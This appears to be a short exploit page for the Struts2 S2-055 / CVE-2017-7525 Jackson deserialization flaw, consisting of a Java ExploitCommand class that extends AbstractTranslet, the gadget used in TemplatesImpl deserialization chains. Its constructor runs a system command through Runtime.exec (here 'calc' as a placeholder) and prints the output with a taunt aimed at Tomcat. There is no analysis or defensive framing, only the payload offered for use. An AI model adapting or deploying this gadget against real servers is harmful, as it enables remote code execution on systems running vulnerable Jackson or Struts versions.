# S2-055 反序列化漏洞Exploit CVE-2017-7525 


```
package exploit;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.*;

public class ExploitCommand extends AbstractTranslet {
	
	public ExploitCommand() throws Exception {

		try {
			BufferedReader br = null;
			// ExploitCommand
			Process p = Runtime.getRuntime().exec("calc");
			br = new BufferedReader(new InputStreamReader(p.getInputStream()));

			String line = null;
			StringBuilder sb = new StringBuilder();
			while ((line = br.readLine()) != null) {
				sb.append(line + "\n");
				System.out.println(sb.toString());
			}
			System.out.println("\n[*] Payload Fuck Tomcat!!!!");
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	public static void main(String[] args) throws Exception {
		ExploitCommand exp = new ExploitCommand();
	}

	@Override
	public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

	}

	@Override
	public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
			throws TransletException {

	}
}
```
